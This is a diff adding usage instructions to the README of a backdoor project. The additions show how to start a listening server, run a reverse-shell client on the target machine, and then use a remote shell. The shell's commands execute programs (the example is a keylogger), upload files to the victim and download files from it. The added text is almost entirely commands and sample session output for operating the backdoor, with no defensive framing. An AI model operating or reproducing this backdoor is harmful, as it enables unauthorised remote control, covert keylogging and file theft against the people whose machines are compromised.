@@ -18,15 +18,71 @@ But in this project, the connection will be only one to one (client / server) wi
 
 <hr>
 
+### RUN Backdoor:
+
+<hr>
+
+On Server machine:
+
+```
+$ ./server_shell
+[+] Listening for Incommig Connections...
+
+```
+
+On Client machine:
+
+```
+$ ./reverse_shell
+```
+
+Server and Client connected
+
+```
+$ ./server_shell
+[+] Listening for Incommig Connections...
+[+] Connection established from: 
+[+] Address: 192.168.1.55
+[+] port: 46020
+[+] Connected
+Linux@127.0.0.1#
+```
+
 ### Commands Shell
 
 ```
 $ cd      --> Get current directory
 $ curr    --> Current directory
-$ Run     --> Execute a program
-$ Upload  --> Upload a File to Client
-$ Downlod --> Downlod a File to Server
-$ Exit    --> Finish shell
+$ run     --> Execute a program
+$ upload  --> Upload a File to Client
+$ downlod --> Downlod a File to Server
+$ exit    --> Finish shell
+```
+
+```
+Linux@127.0.0.1# cd ../            # Before directory
+```
+
+```
+Linux@127.0.0.1# curr              # Current directory
+/home/ubuntu/
+```
+
+```
+Linux@127.0.0.1# run keylogger     # Program in Linux/Windows
+```
+
+```
+Linux@127.0.0.1# upload [File]
+```
+
+```
+Linux@127.0.0.1# download [File]
+```
+
+```
+Linux@127.0.0.1# exit
+$
 ```
 
 * And basic commands of Linux and Windows terminal
